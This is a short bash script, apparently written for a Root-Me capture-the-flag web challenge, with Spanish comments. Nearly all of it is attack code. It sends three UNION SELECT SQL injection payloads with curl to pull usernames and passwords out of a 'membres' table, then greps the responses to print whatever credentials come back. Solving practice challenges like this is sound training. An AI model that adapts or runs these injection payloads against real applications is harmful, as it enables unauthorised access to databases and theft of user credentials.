#!/bin/bash

URL="http://challenge01.root-me.org/web-serveur/ch30/"
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  PROBANDO DIFERENTES MÉTODOS${NC}"
echo -e "${BLUE}========================================${NC}"

# Método 1: Mostrar pass en lugar de username
echo -e "\n${YELLOW}[+] Método 1: pass en lugar de username${NC}"
result1=$(curl -s "$URL?action=membres&id=1' UNION SELECT 1,pass,3,4 FROM membres#" \
    | grep -v "login failed" | grep -v "Authentification" | grep -v "iframe" | grep -v "Membres" | grep -v "CREATE" | grep -v "strong" | grep -v "form" | grep -v "input" | grep -v "submit" | grep -v "html" | grep -v "header" | grep -v "body" | grep -v "title" | grep -v "link" | grep -v "script" | grep -v "style" | head -10)

if [ -n "$result1" ]; then
    echo -e "${GREEN}[✓] Encontrado: $result1${NC}"
else
    echo -e "${RED}[✗] No se encontró nada${NC}"
fi

# Método 2: CONCAT(username,':',pass)
echo -e "\n${YELLOW}[+] Método 2: CONCAT(username,':',pass)${NC}"
result2=$(curl -s "$URL?action=membres&id=1' UNION SELECT 1,CONCAT(username,':',pass),3,4 FROM membres#" \
    | grep -v "login failed" | grep -v "Authentification" | grep -v "iframe" | grep -v "Membres" | grep -v "CREATE" | grep -v "strong" | grep -v "form" | grep -v "input" | grep -v "submit" | grep -v "html" | grep -v "header" | grep -v "body" | grep -v "title" | grep -v "link" | grep -v "script" | grep -v "style" | head -10)

if [ -n "$result2" ]; then
    echo -e "${GREEN}[✓] Encontrado: $result2${NC}"
else
    echo -e "${RED}[✗] No se encontró nada${NC}"
fi

# Método 3: Con delimitador
echo -e "\n${YELLOW}[+] Método 3: Con delimitador ###${NC}"
result3=$(curl -s "$URL?action=membres&id=1' UNION SELECT 1,CONCAT('###',username,':',pass,'###'),3,4 FROM membres#" \
    | grep -o "###.*###" | sed 's/###//g')

if [ -n "$result3" ]; then
    echo -e "${GREEN}[✓] Encontrado: $result3${NC}"
else
    echo -e "${RED}[✗] No se encontró nada${NC}"
fi

echo -e "\n${BLUE}========================================${NC}"
echo -e "${BLUE}  FIN${NC}"
echo -e "${BLUE}========================================${NC}"
